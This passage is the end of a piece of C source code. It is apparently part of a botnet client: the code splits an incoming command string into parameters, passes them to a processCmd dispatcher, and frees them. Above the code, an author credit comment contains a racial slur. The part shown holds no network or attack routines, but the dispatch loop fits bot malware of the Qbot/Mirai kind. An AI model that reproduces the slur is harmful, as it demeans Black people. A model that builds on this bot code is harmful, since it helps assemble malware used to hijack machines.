
 Komodo El Rippr - El Chapo NIGGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 */
                                params[0] = command;

                                while(pch)
                                {
                                        if(*pch != '\n')
                                        {
                                                params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1);
                                                memset(params[paramsCount], 0, strlen(pch) + 1);
                                                strcpy(params[paramsCount], pch);
                                                paramsCount++;
                                        }
                                        pch = strtok(NULL, " ");
                                }

                                processCmd(paramsCount, params);

                                if(paramsCount > 1)
                                {
                                        int q = 1;
                                        for(q = 1; q < paramsCount; q++)
                                        {
                                                free(params[q]);
                                        }
                                }
                        }
                }
        }

        return 0;
}